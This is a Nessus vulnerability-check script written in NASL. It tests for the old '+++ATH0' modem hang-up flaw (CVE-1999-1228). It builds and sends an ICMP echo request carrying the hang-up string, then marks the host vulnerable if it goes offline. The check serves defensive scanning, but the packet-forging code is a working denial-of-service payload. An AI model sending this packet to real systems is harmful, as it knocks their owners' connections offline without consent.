#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10020);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-1999-1228");
 script_xref(name:"OSVDB", value:"12973");
 script_name(english:"+ + + ATH0 Modem Hang Up String Remote DoS");
 script_summary(english:"Makes a modem hang up");
 script_set_attribute(attribute:"synopsis", value:
"The remote modem is affected by a remote command execution
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to disconnect the remote host by sending it an
specially crafted ICMP echo request packet. It is also possible to
make the remote modem hang up and dial any phone number." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/1998_3/0916.html" );
 script_set_attribute(attribute:"solution", value:
"Add 'ATS2=255' in your modem init string." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();

 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 family["english"] = "Denial of Service";
 script_family(english:"Denial of Service");
 script_require_keys("Settings/ParanoidReport"); 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
if (report_paranoia < 2) exit(0);

if ( TARGET_IS_IPV6 ) exit(0);
ip = forge_ip_packet(ip_hl:5, ip_v:4,   ip_off:0,
		     ip_id:9, ip_tos:0, ip_p : IPPROTO_ICMP,
		     ip_len : 20, ip_src : this_host(),
		     ip_ttl : 255);


data = string("+++ATH0\r\n");			  
icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
		 	  icmp_seq : 2, icmp_id : 2, 
			  data:data);

start_denial();
			  
reply1 = send_packet(icmp, pcap_active:TRUE);

alive = end_denial();

if(!alive){
 	security_hole(0);
	set_kb_item(name:"Host/dead", value:TRUE);
	}

 					
